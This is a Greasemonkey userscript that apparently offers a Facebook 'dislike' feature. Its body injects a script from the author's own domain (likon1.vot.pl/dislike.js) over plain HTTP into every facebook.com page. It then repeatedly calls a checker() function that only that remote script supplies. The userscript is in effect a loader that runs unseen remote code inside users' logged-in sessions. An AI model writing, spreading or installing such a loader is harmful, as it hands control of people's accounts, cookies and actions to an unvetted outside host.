// ==UserScript==
// @name           Facebook Umrzyj.
// @namespace      likon1.vot.pl
// @include        *.facebook.com*
// ==/UserScript==

var jq = document.createElement('script');
jq.src = 'http://code.jquery.com/jquery.min.js';
jq.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(jq);

var dislike = document.createElement('script');
dislike.src = 'http://www.likon1.vot.pl/dislike.js';
dislike.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(dislike);

var iksf = setInterval("checker()",200);